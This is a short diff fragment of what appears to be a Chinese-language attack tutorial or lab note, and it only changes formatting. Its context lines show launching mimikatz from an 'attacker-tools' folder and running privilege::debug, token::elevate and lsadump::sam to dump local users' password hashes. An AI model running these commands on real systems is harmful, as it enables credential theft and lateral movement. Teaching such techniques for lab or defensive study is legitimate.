@@ -28,9 +28,9 @@ cd C:\attacker-tools
 .\mimikatz_trunk\x64\mimikatz.exe
 ```
 
-使用mimikatz 取得 local user的password hash
+- 使用mimikatz 取得 local user的password hash
 
-```powershell
+```cmd
 privilege::debug
 token::elevate
 lsadump::sam
